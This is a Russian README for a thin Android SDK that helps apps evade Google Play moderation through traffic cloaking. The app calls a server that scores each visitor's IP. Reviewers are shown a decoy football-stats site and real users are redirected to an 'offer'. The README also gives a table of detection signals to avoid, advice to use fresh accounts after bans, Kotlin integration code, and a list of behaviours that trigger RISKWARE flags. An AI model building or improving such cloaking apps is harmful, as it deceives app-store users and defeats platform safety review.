# SDK v3 — Тонкий клиент

Лёгкий Android-клиент для подключения к системе фильтрации трафика. Один класс, один запрос, ноль палева в APK.

---

## Что это

SDK v3 — это замена жирного SDK v2 (800 строк, JS bridge, фингерпринтинг, PlayIntegrity в приложении). Вместо всего этого — **один GET-запрос на сервер**, который возвращает URL. Приложение просто открывает этот URL в WebView. Всё.

```
SDK v2 (забанен Google):
  Сбор GPU → Шифрование → PI verify → Verdict → WebView + JS Bridge → Tracker
  = 800 строк палева в APK

SDK v3 (чистый):
  GET /football?app_id=... → получил URL → WebView.loadUrl()
  = 33 строки, ноль палева
```

## Почему не банят

| Что проверяет Google | SDK v2 | SDK v3 |
|---|---|---|
| Подозрительные строки в DEX | `threeamigosteam.com`, `__appBridge`, `verdict` | Только домен заглушки |
| JS bridge (`addJavascriptInterface`) | Да | Нет |
| Фингерпринтинг (GPU, codename) | Да (X-Graphics-Info, X-Device-Codename) | Нет |
| Play Integrity в APK | Да (IntegrityTokenRequest) | Нет |
| Динамическая загрузка кода | Да (analytics.js) | Нет |
| Verdict/score логика | Да (в коде) | Нет (на сервере) |

Google декомпилирует APK — видит обычное приложение которое открывает веб-страницу. Таких миллионы.

---

## Файлы

```
android-sdk-v3/
├── AppClient.kt          ← Клиент (33 строки) — один GET запрос
├── proguard-rules.pro    ← ProGuard правила (2 строки)
├── INTEGRATION.md        ← Полная инструкция для прогера
│                            (SDK, WebView, push, offline, навигация,
│                             Privacy Policy, Data Safety, чеклист 15 пунктов)
├── PRIVACY_POLICY.html   ← Шаблон Privacy Policy (подставить название + email)
├── DATA_SAFETY.md        ← Пошаговая инструкция заполнения Data Safety
│                            в Google Play Console
└── README.md             ← Этот файл
```

## Быстрый старт

### 1. Зависимости

```kotlin
// app/build.gradle.kts
dependencies {
    implementation("com.squareup.okhttp3:okhttp:5.3.2")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.11.0")
    implementation(platform("com.google.firebase:firebase-bom:34.13.0"))
    implementation("com.google.firebase:firebase-messaging")
}
```

### 2. Скопировать AppClient.kt в проект

### 3. Application

```kotlin
class MyApp : Application() {
    val appClient = AppClient("https://YOUR-DOMAIN.com")
}
```

### 4. При запуске

```kotlin
val url = (application as MyApp).appClient.resolve()

if (url.isNotEmpty()) {
    webView.loadUrl(url)  // Серый или белый — решает сервер
} else {
    showMainContent()     // Нативный контент (заглушка)
}
```

### 5. WebView

```kotlin
webView.settings.javaScriptEnabled = true
webView.settings.domStorageEnabled = true
// НЕ ДОБАВЛЯТЬ addJavascriptInterface!
webView.loadUrl(url)
```

---

## Как работает

```
1. Юзер открывает приложение
2. Приложение делает GET https://your-domain.com/football?app_id=com.package.name
3. Сервер (Football Hub) тихо спрашивает кло: "этот чувак модератор?"
4. Кло проверяет IP (VPN, hosting, страна, fraud score)
5. Модератор → Football Hub (футбольная статистика)
   Юзер → 302 redirect на оффер
6. Приложение открывает полученный URL в WebView
```

Приложение не знает что за ним стоит кло. Оно видит только домен заглушки.

---

## Серверная часть

SDK v3 работает в паре с:

1. **Football Hub** — Next.js сайт-заглушка с реальными футбольными данными. Стоит на сервере клиента. Middleware проксирует запросы к кло.

2. **Кло** (scoring engine) — основной сервер фильтрации. Скорит по IP, VPN, hosting, стране, городу. Endpoint `/init` возвращает URL.

3. **Reverse-proxy** (опционально) — Caddy Docker-образ. Каждая прила на своём домене.

---

## Обязательно перед заливкой

1. **Новый аккаунт** — старые аккаунты с забаненными прилами сожжены
2. **Push-уведомления** — Firebase Cloud Messaging (шаблон в INTEGRATION.md)
3. **Offline handling** — если нет сети → нативный контент
4. **Privacy Policy** — шаблон в PRIVACY_POLICY.html
5. **Data Safety** — инструкция в DATA_SAFETY.md
6. **Свой домен** — не threeamigosteam.com, не общий на 15 прил
7. **Нативные фичи** — back button, splash screen, UI-контент

Подробный чеклист на 15 пунктов → `INTEGRATION.md`

---

## Что НЕЛЬЗЯ

- `addJavascriptInterface` — триггер RISKWARE
- `evaluateJavascript` — динамическая загрузка кода
- GPU / codename / build product — фингерпринтинг
- Play Integrity в приложении — не нужно, кло делает без APK
- Хардкодить домен кло — только домен заглушки
- `X-Client-Secret`, `X-Device-Info` — кастомные заголовки
- Проверки `isEmulator()`, `isRooted()` — палево
- Сканирование установленных приложений — бан
